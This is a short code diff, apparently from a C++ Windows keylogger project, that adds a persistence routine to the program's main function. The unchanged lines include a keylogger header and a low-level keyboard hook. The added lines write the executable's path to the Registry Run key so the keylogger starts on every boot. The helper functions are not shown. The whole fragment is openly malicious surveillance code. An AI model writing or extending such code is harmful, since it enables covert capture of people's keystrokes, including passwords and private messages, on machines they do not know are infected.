@@ -1,11 +1,21 @@
 #include <windows.h>
 #include <iostream>
 #include <keylogger.h>
+#include <persistence.h>
 
 #pragma comment(lib, "User32.lib")
 
 int main(int argc, char* argv[]) {
     Keylogger kl;
+    wchar_t exePath[MAX_PATH];
+
+    if (!getPath(exePath, MAX_PATH)) {
+        std::cerr << "Unable to get exe path." << std::endl;
+    }
+
+    if (!WriteRegistryRun(exePath)) {
+        std::cerr << "Persistence via Registry Run Key failed." << std::endl;
+    }
 
     HHOOK hKeyboardHook = SetWindowsHookEx(
         WH_KEYBOARD_LL,
